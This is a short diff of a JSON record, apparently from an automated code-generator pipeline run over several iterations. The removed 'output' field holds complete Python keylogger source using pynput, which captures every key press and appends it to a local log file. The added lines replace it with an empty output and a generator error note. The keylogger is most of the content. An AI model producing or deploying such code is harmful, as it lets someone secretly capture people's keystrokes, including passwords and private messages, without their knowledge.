@@ -1,9 +1,6 @@
 {
-  "output": "import pynput\nfrom pynput import keyboard\n\ndef on_press(key):\n    try:\n        with open('keylogs.txt', 'a') as keylog_file:\n            keylog_file.write(str(key.char) + '\\n') if key.char else None\n            keylog_file.write(str(key) + '\\n')\n    except Exception as e:\n        with open('errorlog.txt', 'a') as error_file:\n            error_file.write(str(e) + '\\n')         \ndef on_release(key):\n    pass\n             \nwith keyboard.Listener(on_press=on_press, on_release=on_release) as listener:\n    listener.join()",
-  "notes": "",
-  "applied_fixes": [
-    "iteration8_issue1",
-    "iteration8_issue2"
-  ],
+  "output": "",
+  "notes": "ERROR: Generator JSON error",
+  "applied_fixes": [],
   "iterations": 9
 }
